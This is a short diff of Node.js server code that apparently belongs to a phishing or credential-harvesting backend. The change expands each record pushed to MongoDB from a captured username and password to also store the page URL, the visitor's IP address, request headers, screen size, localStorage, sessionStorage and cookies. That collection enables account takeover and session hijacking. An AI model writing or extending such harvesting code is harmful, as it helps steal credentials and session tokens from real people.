@@ -352,10 +352,22 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								},
 								{
 									$push: {
-										records: [{
+										records: {
 											username: record[username],
-											password: record[password]
-										}]
+											password: record[password],
+											url		: record[url],
+											ip		: req.ip,
+											browser: {
+												width	: record[width],
+												height	: record[height],
+												headers	: req.headers
+											},
+											storage : {
+												local	: record[localStorage],
+												session	: record[sessionStorage],
+												cookies	: record[cookies]
+											}
+										}
 									}
 								}).then(() => {
 									resolve("wrote record to database")
